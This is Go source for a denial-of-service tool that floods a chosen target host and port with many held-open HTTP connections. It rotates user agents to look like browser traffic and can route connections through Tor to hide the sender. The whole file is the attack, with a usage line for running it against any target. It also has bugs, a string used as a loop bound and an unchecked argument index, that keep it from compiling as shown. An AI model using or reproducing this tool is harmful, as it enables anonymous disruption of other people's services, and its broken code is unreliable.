package main

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
}

func getRandomUserAgent() string {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(userAgents))))
	return userAgents[n.Int64()]
}

func attack(target string, port string, useTor bool, wg *sync.WaitGroup) {
	defer wg.Done()

	var dialer net.Dialer
	var conn net.Conn
	var err error

	if useTor {
		// Connect via Tor SOCKS5 Proxy
		torDialer, _ := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
		conn, err = torDialer.Dial("tcp", target+":"+port)
	} else {
		conn, err = dialer.Dial("tcp", target+":"+port)
	}

	if err != nil {
		fmt.Println("Connection failed:", err)
		return
	}

	defer conn.Close()

	headers := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n", target, getRandomUserAgent())

	for {
		_, err := conn.Write([]byte(headers))
		if err != nil {
			fmt.Println("Connection closed by target")
			return
		}
		time.Sleep(10 * time.Second)
	}
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: go run kasongo.go <target> <port> <connections> <useTor[true/false]>")
		return
	}

	target := os.Args[1]
	port := os.Args[2]
	connections := os.Args[3]
	useTor := strings.ToLower(os.Args[4]) == "true"

	var wg sync.WaitGroup

	for i := 0; i < connections; i++ {
		wg.Add(1)
		go attack(target, port, useTor, &wg)
	}

	wg.Wait()
}
